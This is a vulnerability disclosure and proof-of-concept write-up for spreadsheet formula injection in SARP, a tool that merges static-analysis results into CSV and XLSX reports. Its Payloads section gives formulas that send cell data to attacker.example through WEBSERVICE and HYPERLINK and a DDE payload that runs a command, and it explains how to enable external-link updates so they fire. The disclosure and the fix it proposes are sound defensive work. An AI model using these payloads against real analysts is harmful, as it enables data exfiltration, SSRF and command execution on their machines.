# Spreadsheet formula injection in Static Analysis Results Parser (SARP)

## What the bug is

SARP reads output files from static-analysis tools (ESLint, Semgrep, Pylint, cppcheck,
Coverity, Fortify, SpotBugs, Checkmarx, and others, plus generic SARIF) and consolidates
them into a single CSV, XLSX, or SARIF report that an analyst opens and reviews.

The finding fields SARP copies (the scanned file path, the rule ID, the finding message)
come straight from the result file it parses. SARP writes them into the CSV and XLSX
output without neutralizing spreadsheet formula characters. Any field whose value starts
with `=`, `+`, `-`, or `@` becomes a live formula in the report. For XLSX the value is
stored as an actual formula cell, so the spreadsheet evaluates it when the analyst opens
the file and allows external-link update.

- Component: Static Analysis Results Parser (SARP)
- Affected: all releases up to and including 2.11.3 (latest), tested 2026-09-26
- Sink: `src/parsers/parser_tools/parser_writer.py` (`close_writer`, the CSV `csv.writer`
  and XLSX `sheet.append` branches)
- Weakness: CWE-1236 (Improper Neutralization of Formula Elements in a CSV File)

## The attack chain, end to end

1. Attacker input. The attacker commits to a repository, or submits in a pull request or a
   delivered package, either a file whose name is a formula (for example
   `=_xlfn.WEBSERVICE(K2)`) or source that a scanner echoes into a finding message, or
   supplies a repository-local scanner rule whose message is the payload.
2. Scan. A supported scanner runs against that source and writes its normal JSON or SARIF
   report. The attacker-controlled path and message pass through unchanged; JSON and SARIF
   escaping neutralize quotes and control bytes but do not strip a leading `=`.
3. Consolidation. The analyst feeds the scanner report to SARP, which is the tool's job.
   SARP copies the path, rule ID, and message into report rows and writes them to CSV or
   XLSX with no formula neutralization. openpyxl types a leading-`=` string as a formula.
4. Open. The analyst opens the consolidated report and allows external-link update.
5. Impact. The formula runs on the analyst host: `=_xlfn.WEBSERVICE(...)` issues an
   attacker-directed HTTP request (SSRF) and carries report data out in the URL
   (exfiltration); `=cmd|...` reaches command execution on Excel/Windows with DDE enabled.

The attacker never touches the analyst's machine. The author of the scanned code and the
analyst who opens the report are different principals, which is the software-assurance and
CI pull-request model SARP is built for.

## Reachability through supported scanners

The path column is the universal carrier: every supported scanner reports the scanned
file's name, which the attacker chooses, and SARP writes it verbatim. The message column
carries a full URL when the rule is attacker-supplied or the message echoes attacker source
at its start. The rule/check ID is a fixed catalog string, attacker-controlled only when
the ruleset itself is attacker-supplied.

| Scanner (SARP input format) | Adapter | Path carries a formula lead | Message carries a formula lead |
|---|---|---|---|
| ESLint | native (JSON) | yes (attacker names the file) | source identifiers/strings, mid-string |
| Semgrep | native (JSON) | yes | yes, when the rule is repository-supplied |
| Pylint | native (JSON) | yes | source identifiers, mid-string |
| PMD | generic SARIF | yes | ruleset-controlled |
| Bandit | generic SARIF | yes | echoes source literals, mid-string |
| Checkov / Gitleaks / RuboCop | generic SARIF | yes | echoes repository content |

Separate research on several of these scanners confirms the upstream half of the chain:
Semgrep emits the scanned path and rule message as raw attacker-controlled free text; PMD
copies an attacker-committed filename, including formula and delimiter characters, into its
report; Bandit echoes source string literals into its finding message. In each case the
attacker-controlled string is the exact field SARP writes into a report cell, so replacing
a benign value with `=_xlfn.WEBSERVICE(...)` turns the scanner's normal output into a SARP
formula-injection carrier.

A second class of scanner bug is adjacent but not required here. Where an attacker can
already gain code execution or file write on the scanning host (for example arbitrary file
overwrite in a linter's fix mode, or unsafe-deserialization execution from a scanner's
result cache), they can also tamper with the result files SARP later ingests. Those are
separate, higher-severity bugs on the scanners; this SARP finding needs none of them, only
a scanner faithfully reporting an attacker-chosen path or message.

## Payloads

- `=_xlfn.WEBSERVICE("http://attacker.example/leak?d="&A1)` — sends cell data to an
  attacker server and turns the analyst host into a request source (exfiltration / SSRF).
- `=HYPERLINK("http://attacker.example/"&A1,"click")` — data exfiltration on click.
- `=cmd|'/c calc'!A0` — command execution where legacy DDE is enabled or the analyst
  approves the prompt (Excel on Windows).

This PoC uses arithmetic markers (`=1+2`, `=2*3`, `=7*191`) for the emission proof so
nothing is executed, and `=_xlfn.WEBSERVICE(...)` at a loopback listener for the detonation.

### Spreadsheet function encoding (why a bare `=WEBSERVICE(...)` shows `#NAME?`)

OOXML stores any function added after Excel 2007 with an `_xlfn.` prefix in the formula
XML. WEBSERVICE arrived in Excel 2013, so a report cell must hold `_xlfn.WEBSERVICE(...)`;
a bare `WEBSERVICE(...)` is an unknown name and Excel/LibreOffice show `#NAME?`. SARP writes
the field exactly as it appears in the scanner result, so the attacker supplies the
`_xlfn.` prefix. Pre-2007 functions (`HYPERLINK`, the `=cmd|...` DDE syntax, plain
arithmetic) need no prefix and evaluate verbatim.

If the WEBSERVICE cell shows `#VALUE!`, the function ran and issued the HTTP request but got
no usable response, usually because nothing is listening at the URL. That failed attempt is
the outbound request (the SSRF); a listener returns a value and records the request.

### The "external links disabled" warning

LibreOffice disables automatic update of external links by default. WEBSERVICE and DDE count
as external links, so on open you see the infobar "Automatic update of external links has
been disabled" and the formula does not fetch until you allow it. This is the
user-interaction gate for the attack, equivalent to Excel's content-enable prompt. To let it
fire: click "Enable Update" on the infobar and press Ctrl+Shift+F9, or set
Tools > Options > LibreOffice Calc > General > "Update links when opening" to Always.

## Files

- `malicious-eslint-report.json` — a valid ESLint JSON report whose path, rule ID, and
  message carry benign arithmetic markers.
- `realistic-filename-chain.json` — ESLint output for a maliciously named source file
  (`=_xlfn.WEBSERVICE(K2)`), the delivery path that needs no crafted result file.
- `run_poc.sh` — clones SARP v2.11.3, builds a virtualenv, runs SARP against the malicious
  report to produce CSV and XLSX, and verifies the formula emission.
- `verify.py` — loads the XLSX and asserts the injected cells have openpyxl data type `f`
  (formula), and that the CSV cells keep their leading formula character.
- `detonate.sh` — the ceiling proof: starts a loopback listener, has SARP embed a
  `=_xlfn.WEBSERVICE()` formula pointing at it, opens the XLSX in LibreOffice on an isolated
  profile, and reports the outbound request once the analyst allows external-link update.
  Requires a working local LibreOffice with a display.

## Prerequisites

- Linux or macOS with `python3` (3.10+), `pip`, `git`, and network access to clone SARP and
  install its Python dependencies (openpyxl, matplotlib, requests, python-dateutil).
- For `detonate.sh`: a working local LibreOffice.

## Run it

```
./run_poc.sh      # proves the formula-cell emission (no LibreOffice needed)
./detonate.sh     # proves the live SSRF/exfil callback (needs a working LibreOffice)
```

`run_poc.sh` prints the raw CSV and the verification result. `detonate.sh` opens the report
in LibreOffice; click Enable Update on the infobar and press Ctrl+Shift+F9, and it prints
the captured request. Intermediate files land in `.work/` (SARP checkout, virtualenv,
outputs); delete that directory to reset.

## Expected vs observed

Expected: finding text taken from an untrusted result file is written as inert text, so
opening the report cannot run a formula.

Observed, formula emission (`run_poc.sh`):

```
== XLSX formula-typed cells (data_type == 'f') ==
  H2: '=1+2'     <-- stored as a live formula
  J2: '=2*3'     <-- stored as a live formula
  K2: '=7*191'   <-- stored as a live formula
== CSV cells that begin with a formula lead ==
  row2/Path: '=1+2'
  row2/Type: '=2*3'
  row2/Message: '=7*191'

RESULT: formula injection CONFIRMED in both XLSX and CSV output.
```

The XLSX cells for the attacker-controlled Path, Type, and Message fields are stored as
formulas. A field SARP derives itself (the mapped severity string `error`) stays a plain
string, so the formula typing tracks the attacker-supplied content.

Observed, live callback (LibreOffice 25.2, `=_xlfn.WEBSERVICE("http://127.0.0.1:9099/leak?src=SARP_XLSX")`,
after allowing external-link update):

```
127.0.0.1 - - "OPTIONS /leak?src=SARP_XLSX HTTP/1.1"
127.0.0.1 - - "HEAD /leak?src=SARP_XLSX HTTP/1.1"
127.0.0.1 - - "GET /leak?src=SARP_XLSX HTTP/1.1"
```

The GET reached the listener carrying the attacker-chosen query string. The analyst host
made an attacker-directed outbound request and sent data with it. A real attacker server
answers 200 and records the exfiltrated data.

## Fix

Neutralize formula leads before writing any CSV or XLSX cell: if a value starts with `=`,
`+`, `-`, `@`, tab, or carriage return, prefix it with a single quote or write it as a
forced-string cell. Guard on the leading character, not the function name, so the check
catches `=_xlfn.WEBSERVICE(...)`, `=HYPERLINK(...)`, and `=cmd|...` alike. Apply it once in
`close_writer()` so every parser is covered.
